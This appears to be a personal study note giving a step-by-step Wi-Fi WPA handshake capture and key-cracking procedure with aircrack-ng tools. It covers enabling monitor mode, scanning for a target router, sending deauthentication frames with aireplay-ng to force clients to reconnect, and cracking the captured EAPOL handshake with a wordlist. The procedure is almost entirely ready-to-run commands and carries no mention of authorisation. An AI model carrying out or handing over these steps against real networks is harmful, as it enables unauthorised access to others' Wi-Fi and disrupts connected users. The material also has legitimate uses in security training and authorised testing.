# Monitor mode on network adapter
First of all we need to put our network adapter in monitor mode.

```
sudo ifconfig
```

From the output we can choose the name of the adapter to put in monitor mode:
- ![[Pasted image 20261006184453.png]]

We need to kill all the processes that can give troubles to the adapter:
```
sudo airmon-ng check kill
```

Now we can run the monitor mode:
```
sudo airmon-ng start wlan0
```


# Handshake Capture 
Now we need to identify our target:
```
sudo airodump-ng wlan0
```

If everything is ok we can see the details of the networks near to us:
- ![[Pasted image 20261006184935.png]]

In another terminal we start to monitor the target:
```
sudo airodump-ng -c [CHANNEL] --bssid [BSSID_ROUTER] -w capture wlan0
```

This will show us the traffic and the connected hosts:
- ![[Pasted image 20261006185214.png]]

## Forcing the deauth of the connected devices
At this point we want to force a device to disconnect and reconnect in order to collect handshake packets:
```
sudo aireplay-ng -0 5 -a [BSSID_ROUTER] -c [MAC_CLIENT] wlan0
```

We can run it for all the devices, hoping it works, we will see EAPOL in the notes of the devices:
- ![[Pasted image 20261006185854.png]]



# Cracking the EAPOL packets with a dictionary
Now we need to crack the packet and we can do:
```
sudo aircrack-ng -w wordlist_file -b [BSSID_ROUTER] capture-01.cap
```


If everything is ok then we will obtain the key:
- ![[Pasted image 20261006191418.png]]